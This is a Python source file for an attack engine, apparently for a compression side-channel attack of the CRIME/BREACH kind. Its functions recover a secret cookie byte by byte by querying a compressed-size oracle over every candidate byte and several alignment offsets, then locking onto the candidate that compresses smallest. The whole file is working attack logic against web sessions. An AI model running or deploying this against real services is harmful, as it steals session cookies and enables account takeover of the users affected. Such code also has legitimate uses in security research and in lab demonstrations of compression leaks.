import logging
import statistics
from collections.abc import Iterable

LOG = logging.getLogger("attacker.engine")

ALIGNMENT_COUNT = 8


def _per_alignment_means(
    samples: dict[bytes, list[int]],
) -> dict[bytes, list[float]]:
    """Pre-compute mean compressed size per (candidate, alignment_offset)."""
    result: dict[bytes, list[float]] = {}
    for cand, s in samples.items():
        result[cand] = []
        for i in range(ALIGNMENT_COUNT):
            slice_i = s[i::ALIGNMENT_COUNT]
            result[cand].append(statistics.fmean(slice_i) if slice_i else float("inf"))
    return result


def _signal_alignment(align_means: dict[bytes, list[float]]) -> int:
    """Index of the alignment offset where the per-candidate distribution
    is most bimodal (small group of low-mean candidates, larger group of
    high-mean ones).

    Score = median(per-candidate means at this alignment) - min(per-cand
    means at this alignment). Non-informative alignments have all
    candidates near the same value, so median ≈ min and score ≈ 0.
    Signal-bearing alignments have a small group at the back-referenced
    (low) value and a much larger group at the boundary-crossing (high)
    value, so median is far above the min."""
    best_align = 0
    best_score = -1.0
    for i in range(ALIGNMENT_COUNT):
        col = [am[i] for am in align_means.values() if am[i] != float("inf")]
        if not col:
            continue
        score = statistics.median(col) - min(col)
        if score > best_score:
            best_score = score
            best_align = i
    return best_align


def locked(
    ranked: list[bytes],
    samples: dict[bytes, list[int]],
    min_margin: int,
    min_agreement: int,
) -> bool:
    """Lock when, at the signal-bearing alignment, the top candidate's
    mean is at least min_margin bytes below the runner's.

    min_agreement is reinterpreted as a count of alignments at which the
    top candidate must have its minimum-or-near-minimum mean, providing
    secondary robustness against a single-alignment fluke."""
    if len(ranked) < 2:
        return False
    align_means = _per_alignment_means(samples)
    sig = _signal_alignment(align_means)
    top_at_sig = align_means[ranked[0]][sig]
    runner_at_sig = align_means[ranked[1]][sig]
    if runner_at_sig - top_at_sig < min_margin:
        return False
    # Secondary robustness: top candidate's mean at signal align must be
    # the lowest of all candidates (not just lower than runner).
    if top_at_sig != min(align_means[c][sig] for c in align_means):
        return False
    return min_agreement <= 1 or _agreement_count(ranked[0], align_means) >= min_agreement


def _agreement_count(cand: bytes, align_means: dict[bytes, list[float]]) -> int:
    """Number of alignments where `cand` has the strictly lowest mean."""
    wins = 0
    cand_means = align_means[cand]
    for i in range(ALIGNMENT_COUNT):
        m = cand_means[i]
        if all(other_means[i] > m for other, other_means in align_means.items()
               if other != cand):
            wins += 1
    return wins


# Public alias retained for any external callers / tests.
def _alignment_agreement(top: bytes, samples: dict[bytes, list[int]]) -> int:
    return _agreement_count(top, _per_alignment_means(samples))


def _slice_alignment(samples: list[int], align_idx: int) -> list[int]:
    return samples[align_idx::ALIGNMENT_COUNT]


class RecoveryFailed(RuntimeError):
    pass


async def find_next_byte(
    oracle,
    prefix: bytes,
    byte_index: int,
    min_margin: int,
    min_agreement: int,
    max_rounds: int,
) -> bytes:
    candidates = [bytes([c]) for c in range(256)]
    samples: dict[bytes, list[int]] = {c: [] for c in candidates}

    for round_idx in range(max_rounds):
        for cand in candidates:
            for align_len in range(ALIGNMENT_COUNT):
                size = await oracle(prefix, cand, align_len)
                samples[cand].append(size)

        align_means = _per_alignment_means(samples)
        sig = _signal_alignment(align_means)
        ranked = sorted(candidates, key=lambda c: align_means[c][sig])
        top_at_sig = align_means[ranked[0]][sig]
        runner_at_sig = align_means[ranked[1]][sig]
        LOG.info(
            "byte=%d round=%d sig_align=%d top=0x%02x mean@sig=%.2f runner=0x%02x mean@sig=%.2f margin=%.2f",
            byte_index, round_idx + 1, sig,
            ranked[0][0], top_at_sig,
            ranked[1][0], runner_at_sig,
            runner_at_sig - top_at_sig,
        )
        if locked(ranked, samples, min_margin, min_agreement):
            LOG.info("byte=%d locked at 0x%02x", byte_index, ranked[0][0])
            return ranked[0]

    raise RecoveryFailed(
        f"position {byte_index} did not lock after {max_rounds} rounds"
    )


async def run_attack(
    oracle,
    cookie_length: int,
    min_margin: int,
    min_agreement: int,
    max_rounds: int,
) -> bytes:
    recovered = b""
    for byte_index in range(cookie_length):
        winner = await find_next_byte(
            oracle=oracle,
            prefix=recovered,
            byte_index=byte_index,
            min_margin=min_margin,
            min_agreement=min_agreement,
            max_rounds=max_rounds,
        )
        recovered += winner
    return recovered
